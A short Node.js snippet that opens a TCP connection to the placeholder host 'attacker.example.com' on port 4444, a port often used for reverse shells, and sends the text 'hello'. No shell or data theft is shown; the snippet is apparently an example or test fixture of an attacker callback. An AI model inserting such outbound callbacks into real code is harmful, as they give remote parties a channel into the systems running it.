const net = require('net');

const client = net.createConnection({ port: 4444, host: 'attacker.example.com' }, () => {
  client.write('hello\r\n');
});
